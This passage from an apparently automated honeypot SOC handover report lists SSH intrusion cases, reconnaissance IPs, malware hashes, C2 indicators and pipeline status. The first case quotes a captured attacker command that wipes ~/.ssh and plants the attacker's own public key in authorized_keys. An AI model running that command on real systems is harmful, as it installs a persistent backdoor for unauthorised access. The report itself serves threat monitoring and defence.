| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:38:58` | `cowrie.session.connect` |
| `2026-07-06 06:38:58` | `cowrie.client.version` |
| `2026-07-06 06:38:58` | `cowrie.client.kex` |
| `2026-07-06 06:38:59` | `cowrie.login.success` |
| `2026-07-06 06:39:00` | `cowrie.session.params` |
| `2026-07-06 06:39:00` | `cowrie.command.input` |
| `2026-07-06 06:39:00` | `cowrie.command.failed` |
| `2026-07-06 06:39:01` | `cowrie.log.closed` |
| `2026-07-06 06:39:02` | `cowrie.session.params` |
| `2026-07-06 06:39:02` | `cowrie.command.input` |
| `2026-07-06 06:39:02` | `cowrie.session.file_download` |
| `2026-07-06 06:39:02` | `cowrie.log.closed` |
| `2026-07-06 06:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89cb5ada2b48

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-07-06 06:39 |
| **Last Seen** | 2026-07-06 06:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:39:02` | `cowrie.session.connect` |
| `2026-07-06 06:39:02` | `cowrie.client.version` |
| `2026-07-06 06:39:02` | `cowrie.client.kex` |
| `2026-07-06 06:39:03` | `cowrie.login.success` |
| `2026-07-06 06:39:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dec93f3f1b2

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-07-06 06:39 |
| **Last Seen** | 2026-07-06 06:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:39:04` | `cowrie.session.connect` |
| `2026-07-06 06:39:04` | `cowrie.client.version` |
| `2026-07-06 06:39:04` | `cowrie.client.kex` |
| `2026-07-06 06:39:05` | `cowrie.login.success` |
| `2026-07-06 06:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d59a29f21f3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 06:45 |
| **Last Seen** | 2026-07-06 06:45 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:45:25` | `cowrie.session.connect` |
| `2026-07-06 06:45:26` | `cowrie.client.version` |
| `2026-07-06 06:45:26` | `cowrie.client.kex` |
| `2026-07-06 06:45:32` | `cowrie.login.success` |
| `2026-07-06 06:45:36` | `cowrie.session.params` |
| `2026-07-06 06:45:36` | `cowrie.command.input` |
| `2026-07-06 06:45:38` | `cowrie.log.closed` |
| `2026-07-06 06:45:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53fcedb71892

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 06:54 |
| **Last Seen** | 2026-07-06 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 06:54:59` | `cowrie.session.connect` |
| `2026-07-06 06:54:59` | `cowrie.client.version` |
| `2026-07-06 06:54:59` | `cowrie.client.kex` |
| `2026-07-06 06:54:59` | `cowrie.login.success` |
| `2026-07-06 06:55:00` | `cowrie.session.params` |
| `2026-07-06 06:55:00` | `cowrie.command.input` |
| `2026-07-06 06:55:00` | `cowrie.log.closed` |
| `2026-07-06 06:55:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **137** | 2026-07-06 02:58 | 2026-07-06 06:53 | 150m | 0 | `T1592` | 🟠 MEDIUM |
| `164.92.115[.]22` | **120** | 2026-07-06 02:55 | 2026-07-06 06:54 | 80m | 0 | `T1592` | 🟠 MEDIUM |
| `206.81.2[.]201` | **46** | 2026-07-06 02:59 | 2026-07-06 06:49 | 25m | 0 | `T1592` | 🟠 MEDIUM |
| `92.204.138[.]198` | **15** | 2026-07-06 05:09 | 2026-07-06 06:39 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **10** | 2026-07-06 03:07 | 2026-07-06 06:48 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `195.178.110[.]137` | **8** | 2026-07-06 03:28 | 2026-07-06 03:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `128.14.236[.]30` | **5** | 2026-07-06 04:41 | 2026-07-06 04:43 | 1m | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | **5** | 2026-07-06 04:56 | 2026-07-06 06:17 | 2m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **4** | 2026-07-06 03:51 | 2026-07-06 05:50 | 2m | 0 | `T1592` | 🟢 LOW |
| `130.61.23[.]223` | **4** | 2026-07-06 05:13 | 2026-07-06 05:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **4** | 2026-07-06 05:54 | 2026-07-06 06:45 | 4m | 0 | `T1592` | 🟢 LOW |
| `106.12.15[.]118` | **3** | 2026-07-06 02:59 | 2026-07-06 03:16 | 6m | 0 | `T1592` | 🟢 LOW |
| `120.193.9[.]169` | **2** | 2026-07-06 05:06 | 2026-07-06 05:08 | 2m | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | **2** | 2026-07-06 05:14 | 2026-07-06 05:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.106.49[.]209` | **2** | 2026-07-06 05:35 | 2026-07-06 05:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.38.33[.]1` | **2** | 2026-07-06 03:52 | 2026-07-06 03:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.22.137[.]144` | **2** | 2026-07-06 05:59 | 2026-07-06 06:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]192` | **2** | 2026-07-06 05:37 | 2026-07-06 05:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]204` | **2** | 2026-07-06 03:03 | 2026-07-06 03:25 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.96.230[.]94` | 1 | 2026-07-06 03:53 | 2026-07-06 03:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.113[.]93` | 1 | 2026-07-06 05:50 | 2026-07-06 05:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.57.243[.]186` | 1 | 2026-07-06 03:11 | 2026-07-06 03:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.48.216[.]110` | 1 | 2026-07-06 06:01 | 2026-07-06 06:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.208[.]11` | 1 | 2026-07-06 03:41 | 2026-07-06 03:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.193.226[.]44` | 1 | 2026-07-06 04:02 | 2026-07-06 04:02 | 13s | 0 | `T1592` | 🟢 LOW |
| `124.160.173[.]22` | 1 | 2026-07-06 05:36 | 2026-07-06 05:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]237` | 1 | 2026-07-06 03:32 | 2026-07-06 03:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]152` | 1 | 2026-07-06 03:26 | 2026-07-06 03:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-07-06 06:44 | 2026-07-06 06:44 | 4s | 0 | `T1592` | 🟢 LOW |
| `171.8.40[.]107` | 1 | 2026-07-06 03:30 | 2026-07-06 03:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]231` | 1 | 2026-07-06 06:22 | 2026-07-06 06:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | 1 | 2026-07-06 06:08 | 2026-07-06 06:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-07-06 06:51 | 2026-07-06 06:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-07-06 04:14 | 2026-07-06 04:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `207.175.6[.]167` | 1 | 2026-07-06 05:59 | 2026-07-06 06:00 | 9s | 0 | `T1592` | 🟢 LOW |
| `213.166.84[.]45` | 1 | 2026-07-06 06:22 | 2026-07-06 06:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `217.146.80[.]98` | 1 | 2026-07-06 04:27 | 2026-07-06 04:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.14.254[.]32` | 1 | 2026-07-06 06:11 | 2026-07-06 06:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]170` | 1 | 2026-07-06 04:05 | 2026-07-06 04:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-07-06 05:34 | 2026-07-06 05:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-07-06 03:26 | 2026-07-06 03:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-07-06 06:50 | 2026-07-06 06:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `60.167.166[.]161` | 1 | 2026-07-06 03:08 | 2026-07-06 03:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]182` | 1 | 2026-07-06 04:56 | 2026-07-06 04:56 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]95` | 1 | 2026-07-06 04:32 | 2026-07-06 04:32 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]63` | 1 | 2026-07-06 06:05 | 2026-07-06 06:06 | 15s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-06 03:59 | 2026-07-06 03:59 | 43s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-07-06 06:34 | 2026-07-06 06:34 | 1s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-07-06 04:37 | 2026-07-06 04:37 | 1s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]71` | 1 | 2026-07-06 04:28 | 2026-07-06 04:28 | 10s | 0 | `T1592` | 🟢 LOW |
| `85.11.167[.]154` | 1 | 2026-07-06 05:47 | 2026-07-06 05:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]164` | 1 | 2026-07-06 06:11 | 2026-07-06 06:11 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **37/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a6fbbdec757b0fe91ea18dc3d9f7b379c18ca49eeef63afaea8da3c9385b1049` | ELF Binary (Linux executable) (x86-64 64-bit) | `a6fbbdec757b0fe9...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.132.172[.]192` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `81.19.216[.]71` | NL | Infrawatch Limited | **100** ⚠️ | 25 |
| `117.50.208[.]11` | CN | Shanghai UCloud Information Technology Company Limited | **100** ⚠️ | 15 |
| `158.180.79[.]132` | KR | oracle | **100** ⚠️ | 40 |
| `115.57.243[.]186` | CN | China Unicom Henan province network | **100** ⚠️ | 1 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `69.164.217[.]245` | US | Linode | **100** ⚠️ | 50 |
| `124.160.173[.]22` | CN | China Unicom Zhejiang province network | **100** ⚠️ | 20 |
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `67.220.180[.]114` | US | Host World Net LLC | **100** ⚠️ | 21 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 407 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 381 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 239 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 239 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 239 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 796 cases |
| Tool 34  | Credential Extractor        | ✅ 422 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 21 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 83 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (0.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 46 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 381 priority case(s) shown individually · 52 recon entry/entries in table (19 group(s) consolidating 375 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
